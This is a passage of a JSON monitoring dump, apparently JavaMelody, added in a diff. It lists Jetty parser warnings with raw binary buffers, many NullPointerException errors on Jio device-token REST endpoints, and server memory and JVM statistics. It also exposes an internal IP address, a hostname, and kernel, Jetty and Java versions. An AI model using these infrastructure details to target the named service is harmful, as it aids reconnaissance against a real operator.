+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x0 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=117,c=8192,r=116]={\\x00<<<\\x00\\x00qj\\x81n0\\x81k\\xA1\\x03\\x02\\x01\\x05\\xA2\\x03\\x02...\\x02\\x01\\x10\\x02\\x01\\x17\\x02\\x01\\x01\\x02\\x01\\x03\\x02\\x01\\x02>>>073790c76a\\r\\nConte...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log197a67e3d816054bff60d2f46ddf04c103f683a3",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0xC in state=METHOD for buffer HeapByteBuffer@4191e4a0[p=2,l=14,c=8192,r=12]={0\\x0c<<<\\x02\\x01\\x01`\\x07\\x02\\x01\\x02\\x04\\x00\\x80\\x00>>>K\\r\\nDate: Fri, 15 ...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0xC in state=METHOD for buffer HeapByteBuffer@4191e4a0[p=2,l=14,c=8192,r=12]={0\\x0c<<<\\x02\\x01\\x01`\\x07\\x02\\x01\\x02\\x04\\x00\\x80\\x00>>>K\\r\\nDate: Fri, 15 ...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log60d23b9b11a2f9c1b167f7523861dccff1d8e8a8",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ]
+    ],
+    "rootCurrentContextsByThreadId": [],
+    "errors": [
+      {
+        "time": 1529516852602,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529517113717,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529517455365,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529517908573,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529518831037,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529520062035,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529522958731,
+        "httpRequest": "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529527257012,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForJioTv POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529532898909,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529533562976,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529534165952,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529537393082,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529537480658,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529538245044,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529539484460,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529539798659,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529539990491,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529540215722,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529540642628,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529540807588,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529540825126,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529541202696,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529541321449,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529541592359,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529542460613,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529543349453,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529543866549,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529543939056,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529544344167,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529545662427,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529545715340,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529546136268,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529548424095,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529548687865,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529548803556,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529549057738,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529549852437,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529551678838,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529552676436,
+        "httpRequest": "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529552894906,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529552997927,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529553603791,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529555618467,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529555939001,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529556196252,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529557494056,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529557650562,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529557931343,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529558221196,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529558388029,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529558733151,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529558745966,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529560422769,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529560631255,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529560639895,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529560799264,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForJioTv POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529560991535,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529563260777,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529563382543,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529563527790,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529563556812,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529563591974,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529564372745,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529564394519,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529564608709,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529564661726,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529566449644,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529566875812,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529567402968,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529567754225,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529568238722,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529568256259,
+        "httpRequest": "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529568579352,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForJioTv POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529568763610,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529569131009,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529570323368,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529571251215,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529571491023,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529571697511,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529572737875,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529573045033,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529573052222,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529573362059,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529573631864,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529574326979,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529574339536,
+        "httpRequest": "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529574643971,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529575322167,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529576037411,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529576268708,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529576485767,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529576889113,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529577950915,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529578034012,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529578345491,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529578632582,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529579017973,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529579166417,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529579198773,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      },
+      {
+        "time": 1529580014539,
+        "httpRequest": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        "message": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n"
+      }
+    ],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 500,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "job",
+    "errorCounter": true,
+    "storageName": "job",
+    "iconName": "jobs.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "errors": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "memoryInformations": {
+      "usedMemory": 42788283280,
+      "maxMemory": 93430743040,
+      "usedPermGen": -1,
+      "maxPermGen": -1,
+      "usedNonHeapMemory": 136868208,
+      "usedBufferedMemory": 10669488,
+      "loadedClassesCount": 14207,
+      "garbageCollectionTimeMillis": 2996074,
+      "usedPhysicalMemorySize": 152208433152,
+      "usedSwapSpaceSize": 0,
+      "memoryDetails": "Non heap memory = 130 Mo (Perm Gen, Code Cache),\nBuffered memory = 10 Mo,\nLoaded classes = 14,207,\nGarbage collection time = 2,996,074 ms,\nProcess cpu time = 416,131,380 ms,\nCommitted virtual memory = 129,357 Mo,\nFree physical memory = 177,922 Mo,\nTotal physical memory = 323,079 Mo,\nFree swap space = 102,399 Mo,\nTotal swap space = 102,399 Mo"
+    },
+    "tomcatInformationsList": [],
+    "sessionCount": -1,
+    "sessionAgeSum": -1,
+    "activeThreadCount": 0,
+    "usedConnectionCount": 0,
+    "maxConnectionCount": -1,
+    "activeConnectionCount": 0,
+    "transactionCount": 0,
+    "processCpuTimeMillis": 416131380,
+    "systemLoadAverage": 1.15,
+    "systemCpuLoad": 0.7807348863611554,
+    "unixOpenFileDescriptorCount": 1122,
+    "unixMaxFileDescriptorCount": 65536,
+    "host": "NVMBD2AGT050D00@10.140.39.112",
+    "os": "Linux, 2.6.32-504.el6.x86_64 , amd64/64",
+    "availableProcessors": 48,
+    "javaVersion": "Java(TM) SE Runtime Environment, 1.8.0_121-b13",
+    "jvmVersion": "Java HotSpot(TM) 64-Bit Server VM, 25.121-b13, mixed mode",
+    "pid": "63077",
+    "serverInfo": "jetty/9.4.6.v20170531",
+    "contextPath": "",
+    "contextDisplayName": "/",
+    "startDate": "2018-05-17 01:28:49.386 UTC",
+    "jvmArguments": "-XX:MaxPermSize=1024m\n-Xms5120m\n-Xmx100240m",
+    "freeDiskSpaceInTemp": 102392877056,
+    "threadCount": 60,
+    "peakThreadCount": 634,
+    "totalStartedThreadCount": 102018,
+    "threadInformationsList": [
+      {
